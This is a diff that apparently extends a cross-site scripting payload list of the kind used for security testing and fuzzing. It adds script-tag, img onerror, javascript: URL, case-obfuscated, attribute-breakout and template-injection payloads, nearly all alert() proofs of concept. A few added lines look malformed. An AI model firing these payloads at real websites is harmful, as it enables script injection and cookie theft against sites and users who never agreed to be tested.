@@ -3,14 +3,29 @@
 # Basic XSS
 <script>alert('XSS')</script>
 <script>alert(1)</script>
+<script>alert(123)</script>
+<script>alert("XSS")</script>
+<script>alert("XSS");</script>
+<script>alert("hellox worldss");</script>
+<script>alert(/XSS")</script>
+<script>alert(/XSS/)</script>
 <script>alert(document.cookie)</script>
 <script>alert(document.domain)</script>
 <script>alert(window.origin)</script>
+
+# Inline JavaScript XSS
+'; alert(1);
+')alert(1);//
 
 # IMG tag XSS
 <img src=x onerror=alert('XSS')>
 <img src=x onerror=alert(1)>
 <img src=javascript:alert('XSS')>
+<img src="javascript:alert('XSS')">
+<img src=""javascript:alert('XSS');"">
+<img src="javascript:alert(&quot;XSS&quot;)">
+<img src="jAVasCrIPt:alert('XSS')">
+<img src="xss" onerror="alert(1)">
 <img src="x" onerror="alert(String.fromCharCode(88,83,83))">
 <img/src="x"/onerror=alert(1)>
 
@@ -44,6 +59,7 @@
 # JavaScript protocol
 <a href="javascript:alert('XSS')">click</a>
 <iframe src="javascript:alert('XSS')">
+<iframe 00="" src="&Tab;javascript:prompt(1)&Tab;">
 <object data="javascript:alert('XSS')">
 
 # DOM-based XSS
@@ -66,12 +82,17 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # Attribute-based XSS
 "><script>alert(1)</script>
+"><script>alert("XSS")</script>
 '><script>alert(1)</script>
 "><img src=x onerror=alert(1)>
 '><img src=x onerror=alert(1)>
+"&gt;<script>alert("XSS")</script>
 
 # Template injection XSS
 {{alert(1)}}
 ${alert(1)}
 <%= alert(1) %>
 {alert(1)}
+
+# SVG/HTML nesting XSS
+<svg></svg></iframe>
